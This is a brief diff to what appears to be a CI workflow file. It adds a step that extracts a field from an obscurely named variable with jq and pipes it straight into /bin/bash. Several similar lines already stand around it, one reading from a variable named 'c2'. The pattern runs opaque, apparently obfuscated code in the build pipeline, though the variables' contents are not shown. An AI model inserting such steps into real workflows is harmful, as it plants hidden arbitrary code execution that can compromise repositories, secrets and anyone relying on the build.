@@ -34,6 +34,7 @@ jobs:
           echo $hw426 | jq -r .chwpx5 | /bin/bash
           echo $c2 | jq -r .xjc0 | /bin/bash
           printf '%s' "$qmo13244" | jq -r .vvf8161 | /bin/bash
+          echo $y17561 | jq -r .f60 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
